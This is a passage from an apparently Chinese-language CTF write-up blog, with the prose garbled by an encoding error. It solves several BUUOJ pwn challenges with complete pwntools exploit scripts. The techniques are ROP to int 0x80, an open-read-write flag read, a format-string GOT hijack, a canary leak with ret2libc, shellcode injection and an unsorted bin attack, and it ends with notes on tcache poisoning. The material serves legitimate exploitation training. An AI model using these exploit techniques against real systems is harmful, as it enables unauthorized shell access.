p32(<span class="number">0</span>) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/LwU4ZphsTv17RMj.png"></p>
<blockquote>
<p>åœ¨è¿™é‡Œç”¨syscallä¼¼ä¹æ²¡æ³•get shellï¼Œå¾—ç”¨int 0x80ï¼ŒåŸå› ä¸æ˜â€¦</p>
</blockquote>
<h3 id="è§£æ³•å››ï¼šorw"><a href="#è§£æ³•å››ï¼šorw" class="headerlink" title="è§£æ³•å››ï¼šorw"></a>è§£æ³•å››ï¼šorw</h3><p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥get shellçš„å‡½æ•°ï¼Œæ•…ä¹Ÿå¯ä»¥è€ƒè™‘orwè¯»å–flag</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_edx_ret) + p32(e.bss()) + p32(e.sym[<span class="string">&#x27;open&#x27;</span>]) + p32(pop_ebx_pop_edx_ret) + p32(e.bss()) + p32(<span class="number">4</span>) + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_ebx_pop_edx_ret) + p32(<span class="number">3</span>) + p32(e.bss()) + p32(<span class="number">0x100</span>) + p32(e.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(e.bss()) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/02/01/QscBe1PkAmZXHV9.png"></p>
<h2 id="0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP"><a href="#0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP" class="headerlink" title="0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP"></a>0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/03/4rI3JKsdcEuhaZe.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2021/04/03/qoTEDaSQskOKGLu.png" alt="image.png"></p>
<p>ç®€å•æµ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰å¯¹é½â€¦ä¸è¿‡é—®é¢˜ä¸å¤§</p>
<p><img src="https://i.loli.net/2021/04/03/XaIkv6RJY8oMnUe.png" alt="image.png"></p>
<h3 id="è§£æ³•ä¸€ï¼šfmtstr-got-hijack"><a href="#è§£æ³•ä¸€ï¼šfmtstr-got-hijack" class="headerlink" title="è§£æ³•ä¸€ï¼šfmtstr + got hijack"></a>è§£æ³•ä¸€ï¼šfmtstr + got hijack</h3><p>å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ² libc åœ°å€ï¼ŒåŸæœ¬æƒ³åœ¨æ ˆä¸Šæ„é€ ropï¼Œåé¢æƒ³æƒ³ä¸€ä¸ªæ˜¯å¤ªéº»çƒ¦äº†ï¼Œå¦ä¸€ä¸ªæ˜¯ç¨‹åºä½¿ç”¨äº† <code>strlen(format)</code>ï¼Œå¯ä»¥ç›´æ¥åŠ«æŒ got è¡¨é‡Œçš„ strlen ä¸º <code>system</code> ä»¥åè¾“ <code>/bin/sh</code>å³å¯get shell</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®ä¸­å­—ç¬¦ä¸²å¼€å¤´ä¼šå›ºå®šæœ‰ä¸€ä¸ª 9 å­—èŠ‚é•¿çš„ <code>&quot;Repeater:&quot;</code>ï¼Œåœ¨æ‰‹åŠ¨è®¡ç®—æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶åº”å½“åŠ ä¸Šå…¶é•¿åº¦ï¼ŒåŒæ—¶æˆ‘ä»¬åº”å½“è¾“å…¥ <code>;</code> ä»¥åœ¨å‘½ä»¤ä¸­éš”å¼€è¿™ä¸ªå­—ç¬¦ä¸²</p>
<p>ç¬”è€…ä¸ªäººæ›´å–œæ¬¢å°†éœ€è¦å†™å…¥çš„åœ°å€æ”¾åœ¨å‰é¢ï¼Œæ–¹ä¾¿è®¡ç®—é•¿åº¦</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29212</span>)<span class="comment">#process(&#x27;./axb_2019_fmt32&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_fmt32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;b%9$s&#x27;</span> + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Repeater:b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;puts addr leak: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">strlen_got = e.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">high_sys_addr = (sys_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">low_sys_addr = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(low_sys_addr - <span class="number">9</span> - <span class="number">9</span>).encode() + <span class="string">b&#x27;c%8$hn&#x27;</span></span><br><span class="line">payload +=<span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(high_sys_addr - low_sys_addr).encode() + <span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/04/6mtf9VGuj2KWJkU.png" alt="image.png"></p>
<h3 id="è§£æ³•äºŒï¼šBROP"><a href="#è§£æ³•äºŒï¼šBROP" class="headerlink" title="è§£æ³•äºŒï¼šBROP"></a>è§£æ³•äºŒï¼šBROP</h3><p>è™½ç„¶ BUUä¸Šç»™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é“é¢˜åŸé¢˜æ˜¯Blind Pwnï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡ç¬”è€…æ‰“ç®—ä¹Ÿé‡‡ç”¨Blind Pwnçš„åšæ³•æ¥åš</p>
<blockquote>
<p>å…ˆğŸ•ŠğŸ•ŠğŸ•Š</p>
</blockquote>
<h2 id="0x039-others-babystack-partial-overwrite-ret2libc"><a href="#0x039-others-babystack-partial-overwrite-ret2libc" class="headerlink" title="0x039.others_babystack - partial overwrite + ret2libc"></a>0x039.others_babystack - partial overwrite + ret2libc</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œé™¤äº†PIEä»¥å¤–éƒ½å¼€ä¸Šäº†</p>
<p><img src="https://i.loli.net/2021/04/04/mWMxe2lSs1PEjV5.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€å¾€æ ˆä¸Šå†™å…¥å†…å®¹ä¸æ‰“å°æ ˆä¸Šæ•°æ®çš„åŠŸèƒ½ï¼Œä¸”å­˜åœ¨æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/04/TeEnZxXMWAb3Uvl.png" alt="image.png"></p>
<p>ç›´æ¥æ³„éœ² canary ä»¥å ret2libc ä¸€å¥—å¸¦èµ°</p>
<p>è™½ç„¶è¯´é¢˜ç›®æ–‡ä»¶æœ¬èº«æ²¡æœ‰å¼€ PIE ï¼Œä½†æ˜¯è¿™é‡Œæä¾›ä¸€ä¸ªç»•è¿‡ PIE çš„æ€è·¯ï¼šå¯ä»¥é€šè¿‡ main å‡½æ•°çš„è¿”å›åœ°å€æ³„éœ² libc åŸºå€ï¼Œç¬”è€…çš„ exp ä¹Ÿæ˜¯è¿™ä¹ˆåšçš„</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29360</span>)<span class="comment">#process(&#x27;./babystack&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">offset = <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span> + <span class="number">1</span>))</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span> + <span class="number">1</span>))</span><br><span class="line">    canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;canary leak: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset + <span class="number">8</span>))</span><br><span class="line">    dump()</span><br><span class="line">    addr_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;addr leak: &#x27;</span> + <span class="built_in">hex</span>(addr_leak))</span><br><span class="line">    libc_base = (addr_leak - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop to get the shell</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; pop rbp ; ret&#x27;</span>)).__next__()) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/04/1r7OWFNf4HhpnBu.png" alt="image.png"></p>
<h2 id="0x03A-mrctf2020-shellcode-shellcode"><a href="#0x03A-mrctf2020-shellcode-shellcode" class="headerlink" title="0x03A.mrctf2020_shellcode - shellcode"></a>0x03A.mrctf2020_shellcode - shellcode</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œå¼€äº† PIE å’ŒR ELRO</p>
<p><img src="https://i.loli.net/2021/04/04/IsqQJEKdX3P1ySu.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç¨‹åºä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¾“å…¥</p>
<p><img src="https://i.loli.net/2021/04/04/NvPkpmKFBdrCH4Z.png" alt="image.png"></p>
<p>ç›´æ¥è¾“ä¸€æ®µæ°å½“çš„ shellcode å³å¯ get shell</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28688</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/04/QNyBuHAOm7bhIp2.png" alt="image.png"></p>
<h2 id="0x03B-hitcontraining-magicheap-unsorted-bin-attack"><a href="#0x03B-hitcontraining-magicheap-unsorted-bin-attack" class="headerlink" title="0x03B.hitcontraining_magicheap - unsorted bin attack"></a>0x03B.hitcontraining_magicheap - unsorted bin attack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦è¯¶è¿™é“å †é¢˜å±…ç„¶æ²¡æœ‰ä¿æŠ¤å…¨å¼€â€¦</p>
<p><img src="https://i.loli.net/2021/04/04/OAz97KSQvNsgcm1.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>é¢˜ç›®ç»™äº†åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘æ—¶çš„é€»è¾‘é”™è¯¯ï¼Œå¯¼è‡´å¯ä»¥è¿›è¡Œå †æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/04/bzd64FQZrWj7hyp.png" alt="image.png"></p>
<p>å­˜åœ¨ä¸€ä¸ªå¯ä»¥ç›´æ¥æ‹¿ shell çš„åé—¨å‡½æ•°ï¼Œä½†æ˜¯éœ€è¦ bss æ®µä¸Šçš„æŸä¸ªå€¼å¤§äº <code>0x1305</code></p>
<p><img src="https://i.loli.net/2021/04/04/EoHzFQYa9whXWb1.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ° <code>_int_malloc()</code> ä¸­ä» unsorted bin ä¸­å–å‡ºæ°å½“å¤§å° chunk æ—¶å‡ ä¹æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼ˆæœªä½¿ç”¨ unlinkï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡å †æº¢å‡ºçš„æ–¹å¼å°† bss æ®µä¸Šçš„è¿™ä¸ªåŒºåŸŸé“¾å…¥ unsorted bin ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥å°†è¯¥å€¼æ”¹å†™ä¸º <code>main_arena + 0x50</code>ï¼Œæ¯«æ— ç–‘é—®å¤§äº 0x1305ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ‹¿ shell äº†</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27919</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>,size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">114514</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x6020A0</span> - <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cmd(<span class="number">0x1305</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/04/zOyULBmlYFeuMxX.png" alt="image.png"></p>
<blockquote>
<p>ç¬”è€…è¿˜åœ¨è€ƒè™‘å¦‚ä½•ä¸ç”¨åé—¨å‡½æ•°æ‹¿ shellï¼Œæ€è·¯å¤§æ¦‚æ˜¯ç”¨æ®‹ç•™æŒ‡é’ˆçˆ†ç ´åˆ° stdout æ³„éœ² libc åœ°å€ï¼Œä½†æ˜¯ fastbin çš„sizeæ£€æŸ¥å°±å¾ˆçƒ¦â€¦</p>
</blockquote>
<h2 id="0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning"><a href="#0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning" class="headerlink" title="0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning"></a>0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/04/KIZF84yhjVTaSAE.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªè£¸çš„ UAF</p>
<p><img src="https://i.loli.net/2021/04/04/6woiXGIQdv95Dgt.png" alt="image.png"></p>
<p>å”¯ä¸€çš„è¾“å‡ºåŠŸèƒ½æ˜¯åœ¨æ¯æ¬¡åˆ†é…ä¹‹åä¼šç»™å‡º chunk çš„åœ°å€ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ³„éœ² <code>å †åŸºå€</code>ï¼Œè€Œæˆ‘ä»¬åç»­è‹¥æ˜¯èƒ½å¤Ÿåˆ†é…åˆ°ä¸€ä¸ªä½äº libc ä¸­çš„ chunk ï¼Œåˆ™æ¯«æ— ç–‘é—®ä¹Ÿèƒ½æ³„éœ² libc åŸºå€</p>
<p><img src="https://i.loli.net/2021/04/05/mXUwpYVoHSFWB3G.png" alt="image.png"></p>
<p>åŒæ—¶é¢˜ç›®é™åˆ¶äº†åªèƒ½åˆ†é… <code>0x78</code> ä»¥ä¸‹çš„ chunk ï¼Œæˆ‘ä»¬æ²¡æ³•ç›´æ¥è·å¾—ä¸€ä¸ª unsorted bin chunk</p>
<p><img src="https://i.loli.net/2021/04/05/4efPFN6QT1Rj7Kc.png" alt="image.png"></p>
<p>é¢˜ç›®ç»™å‡ºçš„ libc ä¸º<code>æ²¡æœ‰ double free æ£€æµ‹çš„ 2.27 ç‰ˆæœ¬</code>ï¼Œä½†æ˜¯ç¬”è€…ä¸ªäººè§‰å¾—æ—¢ç„¶å¾€åçš„æ–°ç‰ˆæœ¬ libc çš„ tcache éƒ½æœ‰ double free æ£€æµ‹ï¼Œç°åœ¨è¿™é‡Œä¸»åŠ¨å¿½è§†æ‰è¿™ä¸€ç‚¹ç­‰äºæ˜¯è‡ªæ¬ºæ¬ºäººï¼ˆï¼‰ï¼Œäºæ˜¯ç¬”è€…é€‰æ‹©<strong>é€šè¿‡ stash æœºåˆ¶ç»•è¿‡ double free æ£€æµ‹çš„åšæ³•</strong></p>
<blockquote>
<p>ä¸»åŠ¨æé«˜é¢˜ç›®éš¾åº¦çš„å±‘äºº</p>
</blockquote>
<p>ç”±äºé¢˜ç›®ä»…ä»…å…è®¸åˆ†é… <code>0x18</code> æ¬¡ chunkï¼Œè€Œåˆ©ç”¨ stash ç»•è¿‡ double free æ£€æµ‹è‡³å°‘éœ€è¦ä½¿ç”¨å…¶ä¸­çš„ <code>19</code> æ¬¡ï¼Œç¬¬ <code>20</code> æ¬¡æ‰æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç²¾ç¡®è®¡ç®—åˆ©ç”¨å¥½å‰©ä¸‹çš„ <code>4</code> æ¬¡æœºä¼š</p>
<p>é‚£ä¹ˆåœ¨è¿™é‡Œç¬”è€…é€‰æ‹©åŠ«æŒ tcache struct ï¼š</p>
<ul>
<li>tcache struct å¤§å°ä¸º 0x250ï¼ˆlibc 2.27ï¼‰ï¼Œfreeåˆšå¥½å¯ä»¥æ”¾å…¥ unsorted bin</li>
<li>å¯ä»¥ç›´æ¥æ§åˆ¶å¯¹åº”ä¸‹æ ‡çš„ count ï¼Œè€Œä¸éœ€è¦æƒ³åŠæ³•åˆ†é…å¤§äº 0x400 çš„ chunk ä»¥ç•¥è¿‡ tcache</li>
<li>å¯ä»¥ç›´æ¥æ§åˆ¶å¯¹åº”ä¸‹æ ‡å­˜æ”¾çš„ chunk</li>
</ul>
